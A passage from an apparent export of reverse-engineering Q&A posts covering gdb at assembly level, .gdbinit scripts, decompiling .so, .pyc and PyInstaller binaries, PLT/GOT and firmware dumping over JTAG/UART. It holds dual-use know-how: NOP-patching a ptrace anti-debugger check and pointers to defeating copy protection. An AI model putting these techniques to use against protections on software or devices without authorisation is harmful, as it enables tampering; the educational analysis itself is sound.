<p>an alternative to the above would be the use of <code>set args</code> like this:</p>

<pre><code>$ gdb
(gdb) file exe
(gdb) set args argument1 argument2
(gdb) run
</code></pre>

<p><img src=""https://i.stack.imgur.com/GVG6G.png"" alt=""Starting a process using the described method""></p>

<p>You can also see in any case which arguments <code>run</code> would pass to the started process by issuing a:</p>

<pre><code>(gdb) show args
</code></pre>

<p>btw: if you were wondering about environment variables, use GDB's built-in <code>help</code> command as <code>help set</code> and <code>help show</code>. Pointers: <code>set environment VARNAME=VALUE</code> and <code>show environment [VARNAME]</code> and <code>unset environment VARNAME</code>.</p>

<h2>Phew, but why does the program stop with a <code>SIGSEGV</code> (segment fault)?</h2>

<p>Well, we don't know yet, but it looks like this little beasty wants <strong>the proper treatment</strong>. Since we practice defensive computing, we don't want to run anything we don't know much about, right? So let's start over. If this would have been malware we'd have to flush the machine and reinstall or restore a snapshot if it's a VM guest.</p>

<p>First we'll want to run the <code>info</code> command as follows:</p>

<pre><code>(gdb) info file
</code></pre>

<p>Observe:</p>

<p><img src=""https://i.stack.imgur.com/4VTkn.png"" alt=""info file command in GDB""></p>

<p>There are two important pieces of information, the most relevant for us being the line stating:</p>

<pre><code>Entry point: 0x400710
</code></pre>

<p>alright, so we can set a break point on that one and then <code>run</code> the process with the arguments we fancy.</p>

<h2><code>.gdbinit</code> for the win</h2>

<p>But wait, this is getting tedious already. No easy method to automate these steps in some way? As a matter of fact there is. A file named <code>.gdbinit</code> can be used to issue commands to GDB upon startup. You can also pass a file with GDB commands using the <code>-x</code> argument on the (shell) command line. If I have a number of projects, usually they are in subfolders with a <code>.gdbinit</code> file each.</p>

<p><strong>Side-note:</strong> <code>-nx</code> prevents the <code>.gdbinit</code> contents from being executed upon startup.</p>

<p>So we know which arguments we want to pass and we know the address of the break point, this translates to the following <code>.gdbinit</code> file:</p>

<pre><code>file exe
break *0x400710
run argument1 argument2
</code></pre>

<p>The output I get when I start <code>gdb</code> without any other arguments is:</p>

<pre><code>Breakpoint 1 at 0x400710

Breakpoint 1, 0x0000000000400710 in ?? ()
(gdb) 
</code></pre>

<p>Nice! But this looks different ...</p>

<h1>Assembly and GDB</h1>

<p>So you're used to see the next line you're going to execute and then your trusty old <code>(gdb)</code> prompt. But no such thing. We have no source for this binary and furthermore symbols. Doh! So we contemplate the blinking caret at the <code>(gdb)</code> prompt and wonder what to do. Don't fret, GDB can also handle assembly code. Only problem, it defaults to the - in my opinion - inconvenient AT&amp;T assembly syntax. I prefer the Intel flavor and the following command tells GDB to do just that:</p>

<pre><code>(gdb) set disassembly-flavor intel
</code></pre>

<h2>Showings the assembly code</h2>

<p>And how is it going to show us the assembly code? Well, similar to the TUI mode (check the tag wiki for <a href=""/questions/tagged/gdb"" class=""post-tag"" title=""show questions tagged &#39;gdb&#39;"" rel=""tag"">gdb</a>) by using the following command:</p>

<pre><code>(gdb) layout asm
</code></pre>

<p>and if you are so inclined, also:</p>

<pre><code>(gdb) layout regs
</code></pre>

<p>which will also show you the contents of the registers in an overview.</p>

<h2>Let's run it again</h2>

<p>So we end up with the following <code>.gdbinit</code> for our purposes:</p>

<pre><code>file exe
break *0x400710
set disassembly-flavor intel
layout asm
layout regs
run argument1 argument2
</code></pre>

<p>And when we start <code>gdb</code> without arguments we end up with this:</p>

<p><img src=""https://i.stack.imgur.com/nrirU.png"" alt=""GDB with asm and regs layout""></p>

<p>Sweet. So we can see the disassembly while we step through the code. We could conclude this here, but of course there are more tricks to be learned, so why not go a little further.</p>

<p><strong>NOTE:</strong> the registers with white/gray background show that a value has changed. Not too meaningful when we just started the program, but mighty useful when stepping through code later on.</p>

<h3>btw, if you prefer to save screen estate</h3>

<p>... and have it less visual, starting with GDB 7.0 you can use:</p>

<pre><code>set disassemble-next-line on
</code></pre>

<p>on GDB versions before that you can emulate the behavior by settings an <a href=""http://sourceware.org/gdb/current/onlinedocs/gdb/Auto-Display.html#Auto-Display"" rel=""noreferrer"">automatic <code>display</code></a>:</p>

<pre><code>display/i $pc
</code></pre>

<p>or shorter <code>disp/i $pc</code> where <code>/i</code> is the format, you can remember it best by thinking ""instruction"" and <code>$pc</code> being the instruction pointer, also known as program counter - hence <code>pc</code>.</p>

<h3>Also good to know</h3>

<p>Sometimes when stepping through assembly the <code>regs</code> and <code>asm</code> views will get borked. Simply execute the respective <code>layout</code> commands again to restore them to their old glory:</p>

<pre><code>(gdb) layout asm
(gdb) layout regs
</code></pre>

<h1>""Debugging"" at assembly level</h1>

<p>Turns out when you are in assembly mode some of the commands you are used to from source-level debugging simply won't work. That makes sense, because a single source line means usually a dozen instructions or more. The <code>next</code> and <code>step</code> commands, however, have <a href=""http://sourceware.org/gdb/onlinedocs/gdb/Continuing-and-Stepping.html"" rel=""noreferrer"">instruction-level counterparts</a>:</p>

<ul>
<li><code>nexti</code> (shorthand <code>ni</code> ... anyone else thinking of shrubbery?)</li>
<li><code>stepi</code> (shorthand <code>si</code>)</li>
</ul>

<p>From our disassembly above we know:</p>

<pre><code>0x40072d        mov    rdi,0x40f961
</code></pre>

<p>and for all practical purposes this is the <code>main</code> function. Of course if you were to reverse engineer malware you should be more careful, but in this case it is. So let's add a breakpoint to this address (<code>0x40f961</code>) instead of the entry point:</p>

<pre><code>break *0x40f961
</code></pre>

<p>If we <code>examine</code> (shorthand <code>x</code>) the code at which we are currently, we can see:</p>

<pre><code>(gdb) x/5i $pc
x/5i $pc
=&gt; 0x40f961:    push   rbp
   0x40f962:    mov    rbp,rsp
   0x40f965:    mov    eax,0x0
   0x40f96a:    call   0x40911f
   0x40f96f:    pop    rbp
</code></pre>

<p>Okay, the <code>call</code> is what we want to follow, so let's step inside of it using <code>si</code>. We get to see another <code>call</code> immediately at the instruction pointer when entering the function:</p>

<pre><code>(gdb) x/5i $pc
x/5i $pc
=&gt; 0x40911f:    call   0x400b8c
   0x409124:    push   rbp
   0x409125:    mov    rbp,rsp
   0x409128:    push   r10
   0x40912a:    push   r11
</code></pre>

<p>The <code>call</code> leads us to a function which calls <a href=""http://linux.die.net/man/2/ptrace"" rel=""noreferrer""><code>ptrace(PTRACE_TRACEME, ...)</code></a>, now why would it do that?</p>

<pre><code>0x400bab        call   0x4006b8 &lt;ptrace@plt&gt;
</code></pre>

<p>Well, it's an old anti-debugger trick which Mellowcandle has described in another Q&amp;A here:</p>

<ul>
<li><a href=""https://reverseengineering.stackexchange.com/questions/1930/detecting-tracing-in-linux"">Detecting tracing in Linux</a></li>
</ul>

<p>But how do we get around it? We'd have to overwrite the <code>call</code> to the function which calls <code>ptrace()</code> with <code>nop</code> or something along those lines.</p>

<p>This is where GDB becomes a little unwieldy. But we can use <code>set</code> so do the magic for us. Let's first inspect the instruction bytes:</p>

<pre><code>(gdb) x/10b $pc
x/10b $pc
0x40911f:       0xe8    0x68    0x7a    0xff    0xff    0x55    0x48    0x89
0x409127:       0xe5    0x41
</code></pre>

<p>The <code>0xe8</code> is a call instruction and we know now that it is 5 bytes long. So let's <code>nop</code> this out. (<code>x/10b $pc</code> means examine 10 bytes at program counter - default format is hex already).</p>

<p>So we do while stopped at <code>0x40911f</code>:</p>

<pre><code>(gdb) set write
(gdb) set {unsigned int}$pc = 0x90909090
(gdb) set {unsigned char}($pc+4) = 0x90
(gdb) set write off
</code></pre>

<p>and verify the patched location:</p>

<pre><code>(gdb) x/10i $pc
x/10i $pc
=&gt; 0x40911f:    nop
   0x409120:    nop
   0x409121:    nop
   0x409122:    nop
   0x409123:    nop
   0x409124:    push   rbp
   0x409125:    mov    rbp,rsp
   0x409128:    push   r10
   0x40912a:    push   r11
   0x40912c:    push   rbx
</code></pre>

<p>Excellent. We can now execute it.</p>

<h2>Alternatives to the given method</h2>

<ol>
<li>alternative for patching: <code>set {unsigned int}0x40911f = 0x90909090</code> followed by <code>set {unsigned char}0x409123 = 0x90</code></li>
<li>Manipulate the program counter (instruction pointer) instead:

<ul>
<li><code>set $pc+=5</code> or the more explicit <code>set $pc=$pc+5</code></li>
<li><code>jump *$pc+5</code></li>
</ul></li>
</ol>

<h2>Better ways yet to manipulate/patch the running program</h2>

<p>There are alternative (and way superior) methods like <a href=""http://my.opera.com/taviso/blog/show.dml/248232"" rel=""noreferrer"">this one by Tavis Ormandy</a>. I'm reproducing the <code>assemble</code> macro below (in case it goes offline from the other place):</p>

<pre><code>define assemble
 # dont enter routine again if user hits enter
 dont-repeat
 if ($argc)
  if (*$arg0 = *$arg0)
    # check if we have a valid address by dereferencing it,
    # if we havnt, this will cause the routine to exit.
  end
  printf ""Instructions will be written to %#x.\n"", $arg0
 else
  printf ""Instructions will be written to stdout.\n""
 end
 printf ""Type instructions, one per line.\n""
 printf ""End with a line saying just \""end\"".\n""
 if ($argc)
  # argument specified, assemble instructions into memory
  # at address specified.
  shell nasm -f bin -o /dev/stdout /dev/stdin \
    &lt;&lt;&lt; ""$( echo ""BITS 32""; while read -ep '&gt;' r &amp;&amp; test ""$r"" != end; \
                do echo -E ""$r""; done )"" | hexdump -ve \
        '1/1 ""set *((unsigned char *) $arg0 + %#2_ax) = %#02x\n""' \
            &gt; ~/.gdbassemble
  # load the file containing set instructions
  source ~/.gdbassemble
  # all done.
  shell rm -f ~/.gdbassemble
 else
  # no argument, assemble instructions to stdout
  shell nasm -f bin -o /dev/stdout /dev/stdin \
    &lt;&lt;&lt; ""$( echo ""BITS 32""; while read -ep '&gt;' r &amp;&amp; test ""$r"" != end; \
                do echo -E ""$r""; done )"" | ndisasm -i -b32 /dev/stdin
 end
end
document assemble
Assemble instructions using nasm.
Type a line containing ""end"" to indicate the end.
If an address is specified, insert instructions at that address.
If no address is specified, assembled instructions are printed to stdout.
Use the pseudo instruction ""org ADDR"" to set the base address.
end
</code></pre>

<p>Again the above script snippet wasn't written by me, but by Tavis Ormandy - see the link above.</p>

<p>This concludes this little Q&amp;A.</p>
","1936"
"How to decompile Linux .so library files from a MS-Windows OS?","38727","","<p>I would like to decompile the Linux <code>.so</code> files.</p>

<ul>
<li>Any tool to decompile <code>.so</code> files in MS-Windows based operating system ?</li>
<li>Any tools/methods to decompile <code>.so</code> files ?</li>
</ul>
","<p>As 0xea said, the <code>.so</code> file are just regular executable files but packed in a dynamic library style.</p>

<p>I know that you asked specifically about MS-Windows tools, but I will ignore this as 0xea already replied about that. I will try to explain how to do it with UNIX tools.</p>

<h2>Extract the functions from the library</h2>

<p>A first step will be to extract the name of all the functions that are present in this library to know what it is looking like. I will use <code>/usr/lib/libao.so.4.0.0</code> (a random library I took on my system which is small enough to be taken as an example).</p>

<p>First, run <code>readelf</code> on it to see a bit what you are on:</p>

<pre><code>#&gt; readelf -a /usr/lib/libao.so.4.0.0

ELF Header:
Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
Class:                             ELF64
Data:                              2's complement, little endian
Version:                           1 (current)
OS/ABI:                            UNIX - System V
ABI Version:                       0
Type:                              DYN (Shared object file)
Machine:                           Advanced Micro Devices X86-64
Version:                           0x1
Entry point address:               0x1fb0
Start of program headers:          64 (bytes into file)
Start of section headers:          35392 (bytes into file)
Flags:                             0x0
Size of this header:               64 (bytes)
Size of program headers:           56 (bytes)
Number of program headers:         6
Size of section headers:           64 (bytes)
Number of section headers:         29
Section header string table index: 28

[...lots of tables and other information...]
</code></pre>

<p>You may notice that <code>readelf</code> detected an entrypoint. In fact, it does correspond to the procedure in charge of initializing the memory to get the library properly loaded. But, it is of no use for us.</p>

<p>Looking at the rest of the output of <code>readelf -a</code>, the dynamic symbol table (<code>.dynsym</code>) is quite informative because it contains entries like this:</p>

<pre><code>43: 00000000000038e0  1302 FUNC    GLOBAL DEFAULT   13 ao_play@@LIBAO4_1.1.0
</code></pre>

<p>In fact, every function from this dynamic library is in this list and you can extract it simply like this:</p>

<pre><code>#&gt; readelf -a /usr/lib/libao.so.4.0.0 | grep LIBAO4_1.1.0 | grep FUNC

43: 00000000000038e0  1302 FUNC    GLOBAL DEFAULT   13 ao_play@@LIBAO4_1.1.0
44: 0000000000003670   177 FUNC    GLOBAL DEFAULT   13 ao_append_option@@LIBAO4_1.1.0
45: 00000000000040e0    70 FUNC    GLOBAL DEFAULT   13 ao_driver_info@@LIBAO4_1.1.0
46: 0000000000002d40  2349 FUNC    GLOBAL DEFAULT   13 ao_initialize@@LIBAO4_1.1.0
48: 0000000000003ef0   484 FUNC    GLOBAL DEFAULT   13 ao_default_driver_id@@LIBAO4_1.1.0
49: 0000000000003e00   144 FUNC    GLOBAL DEFAULT   13 ao_close@@LIBAO4_1.1.0
50: 0000000000005070   239 FUNC    GLOBAL DEFAULT   13 ao_open_file@@LIBAO4_1.1.0
51: 0000000000005160     7 FUNC    GLOBAL DEFAULT   13 ao_open_live@@LIBAO4_1.1.0
52: 0000000000003730    18 FUNC    GLOBAL DEFAULT   13 ao_append_global_option@@LIBAO4_1.1.0
53: 0000000000003790   326 FUNC    GLOBAL DEFAULT   13 ao_shutdown@@LIBAO4_1.1.0
54: 0000000000004130    16 FUNC    GLOBAL DEFAULT   13 ao_driver_info_list@@LIBAO4_1.1.0
55: 0000000000003750    60 FUNC    GLOBAL DEFAULT   13 ao_free_options@@LIBAO4_1.1.0
56: 0000000000004140    13 FUNC    GLOBAL DEFAULT   13 ao_is_big_endian@@LIBAO4_1.1.0
57: 0000000000003e90    92 FUNC    GLOBAL DEFAULT   13 ao_driver_id@@LIBAO4_1.1.0
</code></pre>

<p>What you get here, is the names of the functions which are in the <code>.so</code> plus the address of their code in the memory (first column).</p>

<p>Note that you can also get this information by using <code>objdump</code> like this:</p>

<pre><code>#&gt; objdump -T /usr/lib/libao.so.4.0.0 | grep LIBAO4_1.1.0 | grep DF
00000000000038e0 g    DF .text  0000000000000516  LIBAO4_1.1.0 ao_play
0000000000003670 g    DF .text  00000000000000b1  LIBAO4_1.1.0 ao_append_option
00000000000040e0 g    DF .text  0000000000000046  LIBAO4_1.1.0 ao_driver_info
0000000000002d40 g    DF .text  000000000000092d  LIBAO4_1.1.0 ao_initialize
0000000000003ef0 g    DF .text  00000000000001e4  LIBAO4_1.1.0 ao_default_driver_id
0000000000003e00 g    DF .text  0000000000000090  LIBAO4_1.1.0 ao_close
0000000000005070 g    DF .text  00000000000000ef  LIBAO4_1.1.0 ao_open_file
0000000000005160 g    DF .text  0000000000000007  LIBAO4_1.1.0 ao_open_live
0000000000003730 g    DF .text  0000000000000012  LIBAO4_1.1.0 ao_append_global_option
0000000000003790 g    DF .text  0000000000000146  LIBAO4_1.1.0 ao_shutdown
0000000000004130 g    DF .text  0000000000000010  LIBAO4_1.1.0 ao_driver_info_list
0000000000003750 g    DF .text  000000000000003c  LIBAO4_1.1.0 ao_free_options
0000000000004140 g    DF .text  000000000000000d  LIBAO4_1.1.0 ao_is_big_endian
0000000000003e90 g    DF .text  000000000000005c  LIBAO4_1.1.0 ao_driver_id
</code></pre>

<h2>Disassemble each function</h2>

<p>It is time now to use <code>objdump</code> (or a more advanced disassembler if you can get one). Given the list of functions and their address in the binary, you can simply run <code>objdump</code> for each function like this:</p>

<pre><code>objdump -d /usr/lib/libao.so.4.0.0 --start-address=0x3730
</code></pre>

<p>Note that, as <code>objdump</code> use linear sweep, the disassembly may not be exact (see the following example) and, you also will have to decide by yourself when it ends.</p>

<pre><code>#&gt; objdump -d /usr/lib/libao.so.4.0.0 --start-address=0x3730

/usr/lib/libao.so.4.0.0:     file format elf64-x86-64

Disassembly of section .text:
0000000000003730 &lt;ao_append_global_option&gt;:
 3730:       48 89 f2                mov    %rsi,%rdx
 3733:       48 89 fe                mov    %rdi,%rsi
 3736:       48 8d 3d cb 52 20 00    lea    0x2052cb(%rip),%rdi
 373d:       e9 4e e6 ff ff          jmpq   1d90 &lt;ao_append_option@plt&gt;
 3742:       66 66 66 66 66 2e 0f    data32 data32 data32 data32 nopw %cs:0x0(%rax,%rax,1)
 3749:       1f 84 00 00 00 00 00 

0000000000003750 &lt;ao_free_options&gt;:
 3750:       55                      push   %rbp
 3751:       53                      push   %rbx
 3752:       48 89 fb                mov    %rdi,%rbx
 3755:       48 83 ec 08             sub    $0x8,%rsp
 3759:       48 85 ff                test   %rdi,%rdi
 375c:       74 27                   je     3785 &lt;ao_free_options+0x35&gt;
 375e:       66 90                   xchg   %ax,%ax
 3760:       48 8b 3b                mov    (%rbx),%rdi
 3763:       48 8b 6b 10             mov    0x10(%rbx),%rbp
 3767:       e8 c4 e5 ff ff          callq  1d30 &lt;free@plt&gt;
 376c:       48 8b 7b 08             mov    0x8(%rbx),%rdi
 3770:       e8 bb e5 ff ff          callq  1d30 &lt;free@plt&gt;
 3775:       48 89 df                mov    %rbx,%rdi
 3778:       48 89 eb                mov    %rbp,%rbx
 377b:       e8 b0 e5 ff ff          callq  1d30 &lt;free@plt&gt;
 [... clip ...]
</code></pre>

<p>And, that's about all (but, get a better disassembler than <code>objdump</code>!).</p>
","2672"
"How do I acquire SoftICE?","37261","","<p>I have seen mentions of SoftICE on various questions throughout this site. However, the <a href=""http://en.wikipedia.org/wiki/SoftICE"">Wikipedia article</a> on SoftICE implies that the tool is abandoned.  Searching google, I see many links claiming to be downloads for SoftICE, but they seem to have questionable origins and intent.  </p>

<p>Is there an official website where I can purchase and download SoftICE, or an official MD5 of a known SoftICE installer?</p>
","<p>SoftICE is pretty much dead. If you're looking for the same look and feel you can always check out <a href=""http://www.sysersoft.com/"">Syser</a> or <a href=""http://bugchecker.com/"">BugChecker</a>. Haven't used them myself as I think most kernel level debugging now a days is done through remote debugging either via a VM or another machine on the network. The same type of person who would use SoftIce would probably use <a href=""http://msdn.microsoft.com/en-us/windows/hardware/gg463009.aspx"">WinDbg</a> today.</p>

<p>Syser:</p>

<blockquote>
  <p>Syser Kernel Debugger</p>
  
  <p>is designed for Windows NT Family based on X86 platform. It is a kernel debugger with full->graphical interfaces and supports assembly debugging and source code debugging.</p>
  
  <p>Softice is left. Syser will continue.</p>
</blockquote>

<p>BugChecker:</p>

<blockquote>
  <p>At this time, I'm searching for contributors in order to make BugChecker a valid, useful, free and open alternative to SoftICE and other commercial debuggers.</p>
</blockquote>
","1450"
"Decompiling .pyc files","34440","","<p>Does anybody have a suggestion for (non commercial) software to decompile ""byte-code"" Python (.pyc) files?</p>

<p>Everything I've found seems to break...</p>
","<p>What Python version you're decompiling? Py3k is not well supported, but there are quite a few decompilers for 2.x. One of the latest projects is this:</p>

<p><a href=""https://github.com/Mysterie/uncompyle2"">https://github.com/Mysterie/uncompyle2</a></p>

<p>It runs on Python 2.7 but supports decompiling 2.5 to 2.7.</p>

<p>Note that some commercial projects has been known to use modified Python interpreters. Modifications can include:</p>

<ul>
<li>bytecode files encryption</li>
<li>changed opcode values or additional opcodes</li>
<li>a heavily customized runtime (e.g. Stackless Python)</li>
</ul>

<p>If you need to handle this, one approach is to convert non-standard bytecode to standard one and then use the usual decompilers (this apparently was used by the people from above project to decompile Dropbox code). Another is to change the decompiler to directly support the variations.</p>
","1702"
"What is PLT/GOT?","31930","","<p>From time to time, when disassembling x86 binaries, I stumble on
reference to <code>PLT</code> and <code>GOT</code>, especially when calling procedures from a
dynamic library.</p>

<p>For example, when running a program in <code>gdb</code>:</p>

<pre><code>(gdb) info file
Symbols from ""/home/user/hello"".
Local exec file: `/home/user/hello', file type elf64-x86-64.
Entry point: 0x400400
    0x0000000000400200 - 0x000000000040021c is .interp
    0x000000000040021c - 0x000000000040023c is .note.ABI-tag
    0x000000000040023c - 0x0000000000400260 is .note.gnu.build-id
    0x0000000000400260 - 0x0000000000400284 is .hash
    0x0000000000400288 - 0x00000000004002a4 is .gnu.hash
    0x00000000004002a8 - 0x0000000000400308 is .dynsym
    0x0000000000400308 - 0x0000000000400345 is .dynstr
    0x0000000000400346 - 0x000000000040034e is .gnu.version
    0x0000000000400350 - 0x0000000000400370 is .gnu.version_r
    0x0000000000400370 - 0x0000000000400388 is .rela.dyn
    0x0000000000400388 - 0x00000000004003b8 is .rela.plt
    0x00000000004003b8 - 0x00000000004003c6 is .init
 =&gt; 0x00000000004003d0 - 0x0000000000400400 is .plt
    0x0000000000400400 - 0x00000000004005dc is .text
    0x00000000004005dc - 0x00000000004005e5 is .fini
    0x00000000004005e8 - 0x00000000004005fa is .rodata
    0x00000000004005fc - 0x0000000000400630 is .eh_frame_hdr
    0x0000000000400630 - 0x00000000004006f4 is .eh_frame
    0x00000000006006f8 - 0x0000000000600700 is .init_array
    0x0000000000600700 - 0x0000000000600708 is .fini_array
    0x0000000000600708 - 0x0000000000600710 is .jcr
    0x0000000000600710 - 0x00000000006008f0 is .dynamic
 =&gt; 0x00000000006008f0 - 0x00000000006008f8 is .got
 =&gt; 0x00000000006008f8 - 0x0000000000600920 is .got.plt
    0x0000000000600920 - 0x0000000000600930 is .data
    0x0000000000600930 - 0x0000000000600938 is .bss
</code></pre>

<p>And, then when disassembling (<code>puts@plt</code>):</p>

<pre><code>(gdb) disas foo
Dump of assembler code for function foo:
   0x000000000040050c &lt;+0&gt;: push   %rbp
   0x000000000040050d &lt;+1&gt;: mov    %rsp,%rbp
   0x0000000000400510 &lt;+4&gt;: sub    $0x10,%rsp
   0x0000000000400514 &lt;+8&gt;: mov    %edi,-0x4(%rbp)
   0x0000000000400517 &lt;+11&gt;:    mov    $0x4005ec,%edi
=&gt; 0x000000000040051c &lt;+16&gt;:    callq  0x4003e0 &lt;puts@plt&gt;
   0x0000000000400521 &lt;+21&gt;:    leaveq
   0x0000000000400522 &lt;+22&gt;:    retq
End of assembler dump.
</code></pre>

<p>So, what are these GOT/PLT ?</p>
","<p>PLT stands for Procedure Linkage Table which is, put simply, used to call external procedures/functions whose address isn't known in the time of linking, and is left to be resolved by the dynamic linker at run time. </p>

<p>GOT stands for Global Offsets Table and is similarly used to resolve addresses. Both PLT and GOT and other relocation information is explained in greater length in <a href=""http://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html"">this article</a>.</p>

<p>Also, Ian Lance Taylor, the author of <a href=""http://en.wikipedia.org/wiki/Gold_%28linker%29"">GOLD</a> has put up an article series on his blog which is totally worth reading (<strong>twenty</strong> parts!): entry point <a href=""http://www.airs.com/blog/archives/38"">here ""Linkers part 1""</a>.</p>
","1993"
"How do I extract a copy of an unknown firmware from a hardware device?","31682","","<p>Appreciate it's a broad question, but despite days of Googling I haven't found straight forward explanation of the general principle of how to ""capture"" or copy an unkown firmware from a piece of hardware. </p>

<p>I gather once you have it you can begin to use various tools to analyse it, but what I want to understand is how to get it in the first place. </p>

<p>From what i understand you need to connect to it via a JTAG or UART connection , after that I'm a bit lost.</p>
","<p>As you may suspect, it very much depends on the hardware. In general, you are correct, JTAG and/or UARTs can be often be used to get a copy of the firmware (downloading a firmware update from the vendor is usually the easiest way of course, but I'm assuming that is not what you mean). </p>

<p>JTAG implementations typically allow you to read/write memory, and flash chips are typically ""mapped"" into memory at some pre-defined address (finding that address is usually a matter of Googling, experience, and trial and error); thus, you can use tools like <a href=""http://urjtag.org/"" rel=""nofollow noreferrer"">UrJTAG</a> and <a href=""http://openocd.sourceforge.net/"" rel=""nofollow noreferrer"">OpenOCD</a> to read the contents of flash.</p>

<p>UART is just a serial port, so what interface or options it provides (if any) is entirely up to the developer who created the system; most bootloaders (e.g., <a href=""http://www.denx.de/wiki/U-Boot"" rel=""nofollow noreferrer"">U-Boot</a>) do allow you to read/write flash/memory, and will dump the ASCII hex to your terminal window. You then would need to parse the hexdump and convert it into actual binary values. Again, YMMV and there may be no way to dump memory or flash via the UART.</p>

<p>Other devices may have other mechanisms that provide similar functionality; for example, Microchip's PIC microcontrollers use <a href=""http://en.wikipedia.org/wiki/In-circuit_serial_programming"" rel=""nofollow noreferrer"">ICSP</a> (In Circuit Serial Programming) interfaces to read, write, and debug firmware. Such interfaces are usually proprietary, and may or may not be documented (Microchip's is well known).</p>

<p>Vendors may take steps to protect or disable debug interfaces such as JTAG, UART and ICSP, but often you can <a href=""https://reverseengineering.stackexchange.com/questions/2337/how-to-dump-flash-memory-with-spi"">dump the flash chip</a> directly (this is usually faster than JTAG/UART, but may require some de/soldering). For devices such as microcontrollers that have the flash chip built-in (i.e., the flash chip is not exposed to you), you may need to resort to <a href=""http://www.bunniestudios.com/blog/?page_id=40"" rel=""nofollow noreferrer"">more advanced techniques</a> for defeating such copy-protections.</p>

<p>Personally, since I don't deal much with microcontroller based systems, dumping the flash chip directly is usually my go-to for grabbing a copy of the firmware from the device.</p>
","3528"
"How do you reverse engineer an EXE ""compiled"" with PyInstaller","29152","","<p>Having recently watched/read a presentation <a href=""http://www.trustedsec.com/files/Owning_One_Rule_All_v2.pdf"">given by Dave Kennedy at DEF CON 20 [PDF]</a>, I'd like to know how to decompile a Python script compiled with <a href=""http://www.pyinstaller.org/"">PyInstaller</a>.</p>

<p>In his presentation, he is creating a basic reverse shell script in Python, and converts it to an EXE with PyInstaller.</p>

<p>My question is how do you take a PyInstaller created EXE and either completely, or generally, retrieve the logic/source code from the original Python script(s)?</p>
","<ol>
<li>extract EXE's appended data (block starting with PYZ, until the end of the file)</li>
<li>extract wanted files with PyInstaller's <a href=""http://www.pyinstaller.org/browser/project/PyInstaller/cliutils/archive_viewer.py"">archive viewer</a></li>
<li>decompyle .PYCs - I personally recommend <a href=""https://github.com/Mysterie/uncompyle2"">Uncompyle2</a> for that.</li>
</ol>
","164"
"Reversing ELF 64-bit LSB executable, x86-64 ,gdb","28728","","<p>I'm a newbie and just got into RE.
I got a ELF 64-bit LSB executable, x86-64. I'm trying to reverse it.
First I tried to set a break point on line 1 using</p>

<pre><code>gdb ./filename
break 1
</code></pre>

<p>The gdb says</p>

<pre><code>No symbol table is loaded.  Use the ""file"" command.
</code></pre>

<p>OKie so gave out file command</p>

<pre><code>(gdb) file filename
Reading symbols from /media/Disk/filename...(no debugging symbols found)...done.
</code></pre>

<p>How could a set a break point to see the execution..?</p>
","<h2>Getting the entrypoint</h2>

<p>If you have no useful symbol, you first need to find the entrypoint of the executable. There are several ways to do it (depending on the tools you have or the tools you like the best):</p>

<ol>
<li><p>Using <code>readelf</code></p>

<pre><code>$&gt; readelf -h /bin/ls
ELF Header:
Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
Class:                             ELF64
Data:                              2's complement, little endian
Version:                           1 (current)
OS/ABI:                            UNIX - System V
ABI Version:                       0
Type:                              EXEC (Executable file)
Machine:                           Advanced Micro Devices X86-64
Version:                           0x1
Entry point address:               0x40489c
Start of program headers:          64 (bytes into file)
Start of section headers:          108264 (bytes into file)
Flags:                             0x0
Size of this header:               64 (bytes)
Size of program headers:           56 (bytes)
Number of program headers:         9
Size of section headers:           64 (bytes)
Number of section headers:         27
Section header string table index: 26
</code></pre>

<p>So, the entrypoint address is <code>0x40489c</code>.</p></li>
<li><p>Using <code>objdump</code></p>

<pre><code>$&gt; objdump -f /bin/ls

/bin/ls:     file format elf64-x86-64
architecture: i386:x86-64, flags 0x00000112:
EXEC_P, HAS_SYMS, D_PAGED
start address 0x000000000040489c
</code></pre>

<p>Again, the entrypoint is <code>0x000000000040489c</code>.</p></li>
<li><p>Using <code>gdb</code></p>

<pre><code>$&gt; gdb /bin/ls
GNU gdb (GDB) 7.6.2 (Debian 7.6.2-1)
...
Reading symbols from /bin/ls...(no debugging symbols found)...done.
(gdb) info files
Symbols from ""/bin/ls"".
Local exec file:
    `/bin/ls', file type elf64-x86-64.
    Entry point: 0x40489c
    0x0000000000400238 - 0x0000000000400254 is .interp
    0x0000000000400254 - 0x0000000000400274 is .note.ABI-tag
    0x0000000000400274 - 0x0000000000400298 is .note.gnu.build-id
    0x0000000000400298 - 0x0000000000400300 is .gnu.hash
    0x0000000000400300 - 0x0000000000400f18 is .dynsym
    0x0000000000400f18 - 0x00000000004014ab is .dynstr
    0x00000000004014ac - 0x00000000004015ae is .gnu.version
    0x00000000004015b0 - 0x0000000000401640 is .gnu.version_r
    0x0000000000401640 - 0x00000000004016e8 is .rela.dyn
    0x00000000004016e8 - 0x0000000000402168 is .rela.plt
    0x0000000000402168 - 0x0000000000402182 is .init
    0x0000000000402190 - 0x00000000004028a0 is .plt
    0x00000000004028a0 - 0x0000000000411f0a is .text
    0x0000000000411f0c - 0x0000000000411f15 is .fini
    0x0000000000411f20 - 0x000000000041701c is .rodata
    0x000000000041701c - 0x0000000000417748 is .eh_frame_hdr
    ...
</code></pre>

<p>Entrypoint is still <code>0x40489c</code>.</p></li>
</ol>

<h2>Locating the <code>main</code> procedure</h2>

<p>Once the entrypoint is known, you can set a breakpoint on it and start looking for the <code>main</code> procedure. Because, you have to know that most of the program will start by a <code>_start</code> procedure in charge of initializing the memory for the process and loading the dynamic libraries. What exactly does this initialization procedure is quite tedious to follow and, most of the time, of no interest at all to understand your program. The <code>main</code> procedure will only start after all the memory is set-up and ready to go. </p>

<p>Lets see how to do that (I assume that the executable has been compile with <code>gcc</code>):</p>

<pre><code>(gdb) break *0x40489c
Breakpoint 1 at 0x40489c
(gdb) run
Starting program: /bin/ls 
warning: Could not load shared library symbols for linux-vdso.so.1.

Breakpoint 1, 0x000000000040489c in ?? ()
</code></pre>

<p>Okay, so we stopped at the very beginning of the executable. At this time, nothing is ready, everything need to be set-up. Let see what are the first steps of the executable:</p>

<pre><code>(gdb) disas 0x40489c,+50
Dump of assembler code from 0x40489c to 0x4048ce:
=&gt; 0x000000000040489c:  xor    %ebp,%ebp
   0x000000000040489e:  mov    %rdx,%r9
   0x00000000004048a1:  pop    %rsi
   0x00000000004048a2:  mov    %rsp,%rdx
   0x00000000004048a5:  and    $0xfffffffffffffff0,%rsp
   0x00000000004048a9:  push   %rax
   0x00000000004048aa:  push   %rsp
   0x00000000004048ab:  mov    $0x411ee0,%r8
   0x00000000004048b2:  mov    $0x411e50,%rcx
